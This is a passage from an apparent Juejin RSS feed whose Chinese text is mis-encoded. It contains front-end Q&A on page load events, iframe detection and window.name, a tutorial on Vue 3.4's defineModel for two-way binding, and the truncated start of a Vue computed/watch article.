<li><code>window.onload</code>ï¼šç­‰æ•´ä¸ªé¡µé¢æ‰€æœ‰èµ„æºï¼ˆåŒ…æ‹¬å›¾ç‰‡ã€Flashã€CSSç­‰ï¼‰<strong>å…¨éƒ¨åŠ è½½å®Œæˆ</strong>åæ‰è§¦å‘ã€‚</li>
<li><strong>æ€§èƒ½å»ºè®®</strong>ï¼šé€šå¸¸å»ºè®®å°†è„šæœ¬é€»è¾‘æ”¾åœ¨ <code>DOMContentLoaded</code> ä¸­ä»¥æå‡å“åº”é€Ÿåº¦ã€‚</li>
</ul>
<h3 data-id="heading-9">Q2ï¼šå¦‚ä½•é€šè¿‡ JS åˆ¤æ–­å½“å‰é¡µé¢æ˜¯å¦åœ¨ iframe ä¸­è¿è¡Œï¼Ÿ</h3>
<p>å‚è€ƒå›ç­”ï¼š</p>
<p>å¯ä»¥é€šè¿‡æ¯”è¾ƒ window.self å’Œ window.topï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">self</span> !== <span class="hljs-variable language_">window</span>.<span class="hljs-property">top</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å½“å‰é¡µé¢è¿è¡Œåœ¨ iframe ä¸­'</span>);
}
</code></pre>
<h3 data-id="heading-10">Q3ï¼šä¸ºä»€ä¹ˆä¸å»ºè®®åœ¨å…¨å±€ä½œç”¨åŸŸä¸­ä½¿ç”¨å˜é‡å <code>name</code>ï¼Ÿ</h3>
<p>å‚è€ƒå›ç­”ï¼š</p>
<p>å› ä¸º window.name æ˜¯ä¸€ä¸ªå†…ç½®çš„ç‰¹æ®Šå±æ€§ã€‚å®ƒæœ‰ä¸€ä¸ªç‰¹æ€§ï¼šå³ä½¿é¡µé¢åˆ·æ–°æˆ–è·³è½¬åˆ°å¦ä¸€ä¸ªåŸŸåï¼Œwindow.name çš„å€¼ä¹Ÿä¼šæŒä¹…å­˜åœ¨ï¼ˆç›´åˆ°çª—å£å…³é—­ï¼‰ã€‚å¦‚æœä½ åœ¨å…¨å±€å®šä¹‰äº† var name = 'test'ï¼Œå®é™…ä¸Šæ˜¯åœ¨ä¿®æ”¹è¿™ä¸ªå†…ç½®å±æ€§ï¼Œå¯èƒ½ä¼šå¼•å‘æ„å¤–çš„è¡Œä¸ºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 3 ä¸­çš„Â defineModelï¼šç®€åŒ–çˆ¶å­ç»„ä»¶é€šä¿¡çš„æ–°åˆ©å™¨]]></title>    <link>https://juejin.cn/post/7596905751110533183</link>    <guid>https://juejin.cn/post/7596905751110533183</guid>    <pubDate>2026-01-19T14:12:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905751110533183" data-draft-id="7596905751110500415" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 3 ä¸­çš„Â defineModelï¼šç®€åŒ–çˆ¶å­ç»„ä»¶é€šä¿¡çš„æ–°åˆ©å™¨"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2026-01-19T14:12:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤©æ–‡å®¶"/> <meta itemprop="url" content="https://juejin.cn/user/141198021370855"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 3 ä¸­çš„Â defineModelï¼šç®€åŒ–çˆ¶å­ç»„ä»¶é€šä¿¡çš„æ–°åˆ©å™¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/141198021370855/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤©æ–‡å®¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T14:12:33.000Z" title="Mon Jan 19 2026 14:12:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue 3 ä¸­çš„ <code>defineModel</code>ï¼šç®€åŒ–çˆ¶å­ç»„ä»¶é€šä¿¡çš„æ–°åˆ©å™¨</h2>
<blockquote>
<p><strong>å‘å¸ƒæ—¶é—´</strong>ï¼š2026å¹´1æœˆ<br/>
<strong>é€‚ç”¨ç‰ˆæœ¬</strong>ï¼šVue 3.4+ï¼ˆ<code>defineModel</code> è‡ª 3.4 èµ·ç¨³å®šå¯ç”¨ï¼‰<br/>
<strong>å…³é”®è¯</strong>ï¼šVue 3ã€defineModelã€åŒå‘ç»‘å®šã€ç»„ä»¶é€šä¿¡ã€Composition API</p>
</blockquote>
<p>åœ¨ Vue 3 çš„æ¼”è¿›è¿‡ç¨‹ä¸­ï¼Œå®˜æ–¹å›¢é˜Ÿä¸æ–­è‡´åŠ›äºæå‡å¼€å‘ä½“éªŒå’Œä»£ç ç®€æ´æ€§ã€‚å…¶ä¸­ï¼Œ<code>defineModel</code> æ˜¯ä¸€ä¸ªå€¼å¾—å…³æ³¨çš„æ–°ç‰¹æ€§â€”â€”å®ƒæå¤§ç®€åŒ–äº†çˆ¶å­ç»„ä»¶ä¹‹é—´å®ç°â€œv-modelâ€åŒå‘ç»‘å®šçš„æµç¨‹ã€‚æœ¬æ–‡å°†å¸¦ä½ æ·±å…¥ç†è§£ <code>defineModel</code> çš„ä½¿ç”¨åœºæ™¯ã€ä¼˜åŠ¿ï¼Œå¹¶é€šè¿‡å®é™…ç¤ºä¾‹å±•ç¤ºå…¶å¼ºå¤§ä¹‹å¤„ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€ä¼ ç»Ÿ v-model åœ¨ç»„ä»¶ä¸­çš„å®ç°æ–¹å¼</h3>
<p>åœ¨ Vue 3.4 ä¹‹å‰ï¼Œè‹¥è¦åœ¨è‡ªå®šä¹‰ç»„ä»¶ä¸­æ”¯æŒ <code>v-model</code>ï¼Œé€šå¸¸éœ€è¦æ‰‹åŠ¨å£°æ˜ <code>props</code> å’Œ <code>emit</code>ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- MyInput.vue --&gt;
&lt;script setup&gt;
const props = defineProps({
  modelValue: String
})

const emit = defineEmits(['update:modelValue'])

function updateValue(value) {
  emit('update:modelValue', value)
}
&lt;/script&gt;

&lt;template&gt;
  &lt;input 
    :value="modelValue" 
    @input="updateValue($event.target.value)" 
  /&gt;
&lt;/template&gt;
</code></pre>
<p>çˆ¶ç»„ä»¶ä½¿ç”¨æ—¶ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;MyInput v-model="message" /&gt;
&lt;/template&gt;
</code></pre>
<p>è™½ç„¶é€»è¾‘æ¸…æ™°ï¼Œä½†æ ·æ¿ä»£ç è¾ƒå¤šï¼Œå°¤å…¶æ˜¯å½“ç»„ä»¶éœ€è¦æ”¯æŒå¤šä¸ª <code>v-model</code>ï¼ˆå¦‚ <code>v-model:title</code>ã€<code>v-model:content</code>ï¼‰æ—¶ï¼Œä»£ç ä¼šè¿…é€Ÿè†¨èƒ€ã€‚</p>
<h3 data-id="heading-2">äºŒã€<code>defineModel</code> çš„è¯ç”Ÿï¼šæ›´ç®€æ´çš„åŒå‘ç»‘å®š</h3>
<p>ä» Vue 3.4 å¼€å§‹ï¼Œ<code>defineModel</code> ä½œä¸ºå®ï¼ˆmacroï¼‰è¢«å¼•å…¥ï¼Œå®ƒè‡ªåŠ¨å¤„ç† <code>props</code> å£°æ˜ä¸ <code>emit</code> è§¦å‘ï¼Œè®©ä½ åªéœ€å…³æ³¨ä¸šåŠ¡é€»è¾‘ã€‚</p>
<h4 data-id="heading-3">åŸºç¡€ç”¨æ³•</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- MyInput.vue --&gt;
&lt;script setup&gt;
const model = defineModel()
&lt;/script&gt;

&lt;template&gt;
  &lt;input v-model="model" /&gt;
&lt;/template&gt;
</code></pre>
<p>å°±è¿™ä¹ˆç®€å•ï¼<code>defineModel()</code> è¿”å›ä¸€ä¸ªå“åº”å¼å¼•ç”¨ï¼ˆrefï¼‰ï¼Œå…¶å€¼ç­‰åŒäº <code>modelValue</code> propï¼Œå¹¶åœ¨èµ‹å€¼æ—¶è‡ªåŠ¨è§¦å‘ <code>update:modelValue</code> äº‹ä»¶ã€‚</p>
<h4 data-id="heading-4">æ”¯æŒå‘½åæ¨¡å‹</h4>
<p>ä½ ä¹Ÿå¯ä»¥ä¸º <code>v-model</code> æŒ‡å®šåç§°ï¼Œå®ç°å¤šæ¨¡å‹ç»‘å®šï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- UserForm.vue --&gt;
&lt;script setup&gt;
const name = defineModel('name')
const email = defineModel('email')
&lt;/script&gt;

&lt;template&gt;
  &lt;input v-model="name" placeholder="å§“å" /&gt;
  &lt;input v-model="email" placeholder="é‚®ç®±" /&gt;
&lt;/template&gt;
</code></pre>
<p>çˆ¶ç»„ä»¶ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;UserForm v-model:name="userName" v-model:email="userEmail" /&gt;
&lt;/template&gt;
</code></pre>
<h4 data-id="heading-5">ç±»å‹å®‰å…¨ï¼ˆé…åˆ TypeScriptï¼‰</h4>
<p><code>defineModel</code> å®Œå…¨æ”¯æŒ TypeScript ç±»å‹æ¨å¯¼ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> model = defineModel&lt;<span class="hljs-built_in">string</span>&gt;({ <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span> })
<span class="hljs-comment">// model çš„ç±»å‹æ˜¯ Ref&lt;string&gt;</span>
</code></pre>
<p>ä½ è¿˜å¯ä»¥ä¼ å…¥é€‰é¡¹é…ç½®é»˜è®¤å€¼ã€æ ¡éªŒè§„åˆ™ç­‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> count = defineModel&lt;<span class="hljs-built_in">number</span>&gt;({
  <span class="hljs-attr">default</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">validator</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> value &gt;= <span class="hljs-number">0</span>
})
</code></pre>
<h3 data-id="heading-6">ä¸‰ã€ä½¿ç”¨åœºæ™¯</h3>
<h4 data-id="heading-7">1. è¡¨å•æ§ä»¶å°è£…</h4>
<p>å¦‚è¾“å…¥æ¡†ã€å¼€å…³ã€é€‰æ‹©å™¨ç­‰éœ€è¦åŒå‘ç»‘å®šçš„ UI ç»„ä»¶ã€‚</p>
<h4 data-id="heading-8">2. å¯ç¼–è¾‘çš„å¡ç‰‡æˆ–åˆ—è¡¨é¡¹</h4>
<p>ä¾‹å¦‚ä¸€ä¸ªå¯ç¼–è¾‘æ ‡é¢˜çš„ä»»åŠ¡å¡ç‰‡ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
const title = defineModel('title')
&lt;/script&gt;

&lt;template&gt;
  &lt;div class="card"&gt;
    &lt;input v-model="title" /&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<h4 data-id="heading-9">3. å¤æ‚è¡¨å•çš„å­æ¨¡å—</h4>
<p>å°†å¤§è¡¨å•æ‹†åˆ†ä¸ºå¤šä¸ªå­ç»„ä»¶ï¼Œæ¯ä¸ªå­ç»„ä»¶é€šè¿‡ <code>defineModel</code> ç®¡ç†è‡ªå·±çš„çŠ¶æ€ï¼Œé¿å…å±‚å±‚ä¼ é€’ <code>v-model</code> çš„ç¹çã€‚</p>
<h3 data-id="heading-10">å››ã€ä¼˜åŠ¿æ€»ç»“</h3>





























<table><thead><tr><th>ä¼˜åŠ¿</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>âœ… <strong>å‡å°‘æ ·æ¿ä»£ç </strong></td><td>æ— éœ€æ‰‹åŠ¨å£°æ˜ <code>props</code> å’Œ <code>emit</code>ï¼Œä¸€è¡Œä»£ç æå®šåŒå‘ç»‘å®š</td></tr><tr><td>âœ… <strong>æå‡å¯è¯»æ€§</strong></td><td>é€»è¾‘æ›´èšç„¦ï¼Œç»„ä»¶æ„å›¾ä¸€ç›®äº†ç„¶</td></tr><tr><td>âœ… <strong>å¤©ç„¶æ”¯æŒå¤šæ¨¡å‹</strong></td><td>è½»æ¾å®ç° <code>v-model:foo</code>ã€<code>v-model:bar</code></td></tr><tr><td>âœ… <strong>ç±»å‹å‹å¥½</strong></td><td>ä¸ TypeScript æ— ç¼é›†æˆï¼Œæ”¯æŒç±»å‹æ³¨è§£å’Œæ ¡éªŒ</td></tr><tr><td>âœ… <strong>ç¬¦åˆç›´è§‰</strong></td><td><code>v-model="xxx"</code> ç›´æ¥æ˜ å°„åˆ° <code>defineModel('xxx')</code>ï¼Œå¿ƒæ™ºè´Ÿæ‹…ä½</td></tr></tbody></table>
<h3 data-id="heading-11">äº”ã€æ³¨æ„äº‹é¡¹</h3>
<ul>
<li><code>defineModel</code> ä»…åœ¨ <code>&lt;script setup&gt;</code> ä¸­å¯ç”¨ã€‚</li>
<li>è‹¥éœ€å…¼å®¹ Vue 3.3 æˆ–æ›´ä½ç‰ˆæœ¬ï¼Œä»éœ€ä½¿ç”¨ä¼ ç»Ÿæ–¹å¼ã€‚</li>
<li>åœ¨æŸäº›éœ€è¦ç²¾ç»†æ§åˆ¶æ›´æ–°æ—¶æœºçš„åœºæ™¯ï¼ˆå¦‚é˜²æŠ–ã€æ ¼å¼åŒ–è¾“å…¥ï¼‰ï¼Œå¯èƒ½ä»éœ€æ‰‹åŠ¨å¤„ç† <code>emit</code>ï¼Œä½†å¤§å¤šæ•°æƒ…å†µä¸‹ <code>defineModel</code> å·²è¶³å¤Ÿã€‚</li>
</ul>
<h3 data-id="heading-12">å…­ã€ç»“è¯­</h3>
<p><code>defineModel</code> æ˜¯ Vue 3.4 å¸¦æ¥çš„ä¸€ä¸ªâ€œå°è€Œç¾â€çš„æ”¹è¿›ï¼Œå®ƒä½“ç°äº† Vue å›¢é˜Ÿå¯¹å¼€å‘è€…ä½“éªŒçš„æŒç»­ä¼˜åŒ–ã€‚é€šè¿‡å‡å°‘é‡å¤ä»£ç ã€æå‡è¡¨è¾¾åŠ›ï¼Œè®©ç»„ä»¶å¼€å‘æ›´åŠ æ„‰æ‚¦é«˜æ•ˆã€‚</p>
<p>å¦‚æœä½ æ­£åœ¨ä½¿ç”¨ Vue 3.4+ï¼Œä¸å¦¨åœ¨ä¸‹ä¸€ä¸ªç»„ä»¶ä¸­å°è¯• <code>defineModel</code>â€”â€”ä½ ä¼šå‘ç°ï¼ŒåŸæ¥åŒå‘ç»‘å®šå¯ä»¥å¦‚æ­¤ç®€å•ï¼</p>
<hr/>
<p><strong>å‚è€ƒèµ„æ–™</strong>ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fcore%2Freleases%2Ftag%2Fv3.4.0" target="_blank" title="https://github.com/vuejs/core/releases/tag/v3.4.0" ref="nofollow noopener noreferrer">Vue 3.4 Release Notes</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fvuejs.org%2Fapi%2Fsfc-script-setup.html%23definemodel" target="_blank" title="https://vuejs.org/api/sfc-script-setup.html#definemodel" ref="nofollow noopener noreferrer">Vue å®˜æ–¹æ–‡æ¡£ - defineModel</a></li>
</ul>
<blockquote>
<p>ä½œè€…ï¼šæŸå‰ç«¯å·¥ç¨‹å¸ˆ<br/>
åŸåˆ›å†…å®¹ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚æ¬¢è¿åœ¨è¯„è®ºåŒºäº¤æµä½ çš„ä½¿ç”¨å¿ƒå¾—ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 å“åº”å¼ç³»ç»Ÿâ€”â€”computed å’Œ watch]]></title>    <link>https://juejin.cn/post/7596905751110664255</link>    <guid>https://juejin.cn/post/7596905751110664255</guid>    <pubDate>2026-01-19T14:27:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905751110664255" data-draft-id="7596905751110647871" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 å“åº”å¼ç³»ç»Ÿâ€”â€”computed å’Œ watch"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2026-01-19T14:27:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç§€ç§€ä¸åªä¼šå‰ç«¯"/> <meta itemprop="url" content="https://juejin.cn/user/1410009035452887"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 å“åº”å¼ç³»ç»Ÿâ€”â€”computed å’Œ watch
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1410009035452887/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç§€ç§€ä¸åªä¼šå‰ç«¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T14:27:30.000Z" title="Mon Jan 19 2026 14:27:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
